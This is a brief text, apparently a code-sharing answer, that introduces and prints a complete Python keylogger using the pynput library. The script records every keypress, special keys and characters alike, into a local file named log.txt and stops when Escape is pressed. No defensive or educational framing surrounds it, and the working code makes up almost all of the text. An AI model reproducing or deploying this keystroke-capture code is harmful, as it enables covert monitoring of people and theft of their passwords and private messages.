Here is a sample of code showing the implementation of a keylogger in python using pynput:
```python
from pynput.keyboard import Key, Listener

def on_press(key):
    with open('log.txt', 'a') as f:
        if str(key).startswith('Key') or len(str(key)) > 3:  # for special keys like F1, Shift etc.
            f.write(str(key)+'\n')
        else:                   # for normal characters and numbers pressed
            f.write(key.char+'\n')
    
def on_release(key):
    if key == Key.esc:          # Stop Listener when ESC is pressed 
        return False
       
with Listener(on_press=on_press, on_release=on_release) as listener:  listener.join()
```